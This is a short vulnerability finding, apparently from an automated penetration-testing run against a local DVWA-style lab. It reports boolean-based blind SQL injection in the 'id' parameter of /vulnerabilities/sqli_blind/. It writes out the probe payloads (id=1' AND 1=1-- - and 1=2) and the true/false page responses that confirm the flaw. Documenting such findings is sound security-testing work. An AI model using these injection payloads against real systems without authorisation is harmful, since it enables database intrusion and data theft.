title: Blind SQL Injection in /vulnerabilities/sqli_blind/
description: Boolean-based blind SQL injection in the id parameter. Differential responses for true (1=1) vs false (1=2) conditions allow character-by-character data extraction.
poc: Probe request against http://127.0.0.1:8080/vulnerabilities/sqli_blind/; observed proving result from prior stage handoff: When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.
proof: When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.

proof_excerpts.excerpt: When id=1' AND 1=1-- -: 'User ID exists in database.' When id=1' AND 1=2-- -: 'User ID is MISSING from database.' Differential response confirms blind SQL injection.
